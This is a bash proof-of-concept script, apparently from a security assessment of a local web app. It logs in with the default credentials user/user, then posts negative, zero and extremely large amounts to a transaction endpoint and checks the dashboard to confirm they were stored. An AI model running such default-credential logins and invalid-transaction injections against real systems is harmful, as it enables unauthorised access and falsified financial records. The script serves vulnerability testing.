#!/bin/bash

# POC: Business Logic Flaw - Invalid Transaction Amounts Accepted
# This script demonstrates that the add_transaction endpoint accepts invalid amounts:
# - Negative values (should be rejected)
# - Zero values (should be rejected)
# - Extremely large values (should be rejected or limited)
# Uses default credentials (user/user) to authenticate first

TARGET_URL="http://localhost:5003/add_transaction"
LOGIN_URL="http://localhost:5003/login"
DASHBOARD_URL="http://localhost:5003/dashboard"
COOKIE_JAR="/tmp/cookies.txt"

echo "=========================================="
echo "POC: Invalid Transaction Amount Validation"
echo "=========================================="
echo ""

# Step 1: Authenticate with default credentials
echo "[STEP 1] Authenticating with default credentials (user/user)..."
LOGIN_RESPONSE=$(curl -s -c "$COOKIE_JAR" -X POST "$LOGIN_URL" \
  -d "username=user&password=user")

if echo "$LOGIN_RESPONSE" | grep -qi "redirect\|dashboard"; then
    echo "✓ Authentication successful"
else
    echo "⚠ Login response: $LOGIN_RESPONSE"
fi
echo ""

# Test 1: Negative amount
echo "[TEST 1] Creating transaction with NEGATIVE amount (-100.0)"
echo "Command: curl -b $COOKIE_JAR -X POST $TARGET_URL -d 'name=TestNegative&email=test@test.com&amount=-100'"
RESPONSE1=$(curl -s -b "$COOKIE_JAR" -X POST "$TARGET_URL" \
  -d "name=TestNegative&email=test@test.com&amount=-100")
echo "Response (first 200 chars): ${RESPONSE1:0:200}"
echo ""

# Test 2: Zero amount
echo "[TEST 2] Creating transaction with ZERO amount (0.0)"
echo "Command: curl -b $COOKIE_JAR -X POST $TARGET_URL -d 'name=TestZero&email=test@test.com&amount=0'"
RESPONSE2=$(curl -s -b "$COOKIE_JAR" -X POST "$TARGET_URL" \
  -d "name=TestZero&email=test@test.com&amount=0")
echo "Response (first 200 chars): ${RESPONSE2:0:200}"
echo ""

# Test 3: Extremely large amount
echo "[TEST 3] Creating transaction with EXTREMELY LARGE amount (999999999999.99)"
echo "Command: curl -b $COOKIE_JAR -X POST $TARGET_URL -d 'name=TestLarge&email=test@test.com&amount=999999999999.99'"
RESPONSE3=$(curl -s -b "$COOKIE_JAR" -X POST "$TARGET_URL" \
  -d "name=TestLarge&email=test@test.com&amount=999999999999.99")
echo "Response (first 200 chars): ${RESPONSE3:0:200}"
echo ""

# Verify transactions were stored by checking dashboard
echo "[VERIFICATION] Checking stored transactions on dashboard"
echo "Retrieving dashboard to confirm invalid transactions are present..."
DASHBOARD=$(curl -s -b "$COOKIE_JAR" "$DASHBOARD_URL")

# Look for our test transactions
FOUND_NEGATIVE=0
FOUND_ZERO=0
FOUND_LARGE=0

if echo "$DASHBOARD" | grep -q "TestNegative"; then
    FOUND_NEGATIVE=1
    echo "✓ Found transaction: TestNegative"
fi

if echo "$DASHBOARD" | grep -q "TestZero"; then
    FOUND_ZERO=1
    echo "✓ Found transaction: TestZero"
fi

if echo "$DASHBOARD" | grep -q "TestLarge"; then
    FOUND_LARGE=1
    echo "✓ Found transaction: TestLarge"
fi

# Check for amount values
if echo "$DASHBOARD" | grep -qi "\-100\|-100\.0"; then
    echo "✓ Negative amount (-100) stored in database"
fi

if echo "$DASHBOARD" | grep -q ">0<\|>0\.0<"; then
    echo "✓ Zero amount (0) stored in database"
fi

if echo "$DASHBOARD" | grep -q "999999999999"; then
    echo "✓ Large amount (999999999999) stored in database"
fi

echo ""

# Final determination
if [ $FOUND_NEGATIVE -eq 1 ] || [ $FOUND_ZERO -eq 1 ] || [ $FOUND_LARGE -eq 1 ]; then
    VULN_FOUND=1
    echo "✓✓✓ VULNERABILITY CONFIRMED ✓✓✓"
    echo "Invalid transactions were accepted and stored in the database"
else
    # Check if responses indicate successful creation
    if echo "$RESPONSE1$RESPONSE2$RESPONSE3" | grep -q "redirect\|success"; then
        VULN_FOUND=1
        echo "✓✓✓ VULNERABILITY CONFIRMED ✓✓✓"
        echo "Invalid transactions were accepted (redirect responses)"
    else
        VULN_FOUND=0
        echo "Checking response content..."
        echo "Response 1: $RESPONSE1"
        echo "Response 2: $RESPONSE2"
        echo "Response 3: $RESPONSE3"
    fi
fi

echo ""
echo "=========================================="
echo "POC Results Summary:"
echo "=========================================="
if [ $VULN_FOUND -eq 1 ]; then
    echo "✓ The add_transaction endpoint accepts:"
    echo "  1. Negative amounts (refund/fraud exploit)"
    echo "  2. Zero amounts (accounting confusion)"
    echo "  3. Extremely large amounts (overflow/calculation manipulation)"
    echo ""
    echo "✓ No input validation is performed on amount parameter"
    echo "✓ Business logic integrity is compromised"
    echo ""
    echo "Exit code: 0 (VULNERABILITY CONFIRMED)"
    exit 0
else
    echo "⚠ Unable to confirm vulnerability"
    echo "Exit code: 1"
    exit 1
fi
echo "=========================================="